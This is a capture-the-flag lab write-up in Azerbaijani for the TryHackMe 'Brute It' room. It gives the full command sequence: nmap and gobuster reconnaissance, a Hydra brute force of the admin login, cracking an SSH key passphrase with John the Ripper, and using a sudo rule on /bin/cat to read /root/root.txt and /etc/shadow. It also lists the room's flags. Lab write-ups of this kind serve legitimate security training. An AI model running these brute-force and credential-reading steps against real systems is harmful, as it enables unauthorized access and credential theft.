# TryHackMe — Brute It Room Writeup
**URL:** https://tryhackme.com/room/bruteit  
**Çətinlik:** Asan  
**Kateqoriya:** Brute Force, SSH, Privilege Escalation

---

## Xülasə

Bu room aşağıdakı texnikaları əhatə edir:
- Nmap ilə port skanı
- Gobuster ilə direktory kəşfi
- Hydra ilə web login brute force
- SSH Private Key tapma
- John the Ripper ilə passphrase crack
- Sudo ilə Root privilege escalation

---

## 1. Kəşfiyyat (Reconnaissance)

### Nmap Skanı

```bash
nmap -sV -sC 10.10.16.131
```

**Nəticə:**
```
22/tcp  open  ssh     OpenSSH 7.6p1
80/tcp  open  http    Apache httpd 2.4.29
```

### Gobuster ilə Direktory Kəşfi

```bash
gobuster dir -u http://10.10.16.131 -w /usr/share/wordlists/dirb/common.txt
```

**Nəticə:**
```
/admin    (Status: 301)
/index.html (Status: 200)
```

---

## 2. Web Login Brute Force

### Admin səhifəsi tapıldı

```
http://10.10.16.131/admin/
```

Login forması var idi. Form field adları:
```
user=^USER^&pass=^PASS^
```

### Hydra ilə Brute Force

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.16.131 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid" -f
```

**Nəticə:**
```
[80][http-post-form] host: 10.10.16.131
login: admin
password: [şifrə]
```

### Admin panelə giriş

Admin paneldə **Web Flag** tapıldı:
```
THM{brut3_f0rce_is_e4sy}
```

Həmçinin **John-un şifrəli SSH private key-i** tapıldı.

---

## 3. SSH Private Key Crack

### id_rsa faylı saxlandı

```bash
nano id_rsa
```

Key yapışdırıldı:
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
...
-----END RSA PRIVATE KEY-----
```

### John the Ripper ilə Crack

```bash
ssh2john id_rsa > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Nəticə:**
```
id_rsa : rockinroll
```

### SSH ilə Giriş

```bash
chmod 600 id_rsa
ssh -i id_rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa john@10.10.16.131
```

Passphrase:
```
rockinroll
```

### User Flag

```bash
cat /home/john/user.txt
```

```
THM{a_password_is_not_a_barrier}
```

---

## 4. Privilege Escalation — John → Root

### Sudo icazələri yoxlandı

```bash
sudo -l
```

**Nəticə:**
```
(root) NOPASSWD: /bin/cat
```

### Root Flag

`/bin/cat` sudo ilə işləyir — root fayllarını oxuya bilərik!

```bash
sudo cat /root/root.txt
```

```
THM{pr1v1l3g3_3sc4l4t10n}
```

### Bonus — Root şifrəsini tap

```bash
sudo cat /etc/shadow
```

Root hash tapıldı, John ilə crack edildi:

```bash
john root_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## Öyrənilən Texnikalar

| Texnika | İzah |
|---------|------|
| **Nmap** | Port və servis skanı |
| **Gobuster** | Gizli direktoryları tap |
| **Hydra** | Web login brute force |
| **ssh2john + John** | SSH key passphrase crack |
| **Sudo Abuse** | `/bin/cat` ilə root faylları oxu |

---

## Alətlər

| Alət | İstifadə |
|------|---------|
| `nmap` | Port skanı |
| `gobuster` | Direktory kəşfi |
| `hydra` | Brute force |
| `ssh2john` | Key → hash çevirmə |
| `john` | Hash crack |
| `ssh` | Uzaq giriş |

---

## Flags

| Flag | Dəyər |
|------|-------|
| Web Flag | `THM{brut3_f0rce_is_e4sy}` |
| User Flag | `THM{a_password_is_not_a_barrier}` |
| Root Flag | `THM{pr1v1l3g3_3sc4l4t10n}` |

---

*Writeup: TryHackMe Brute It Room — RaminAbdullayevv*
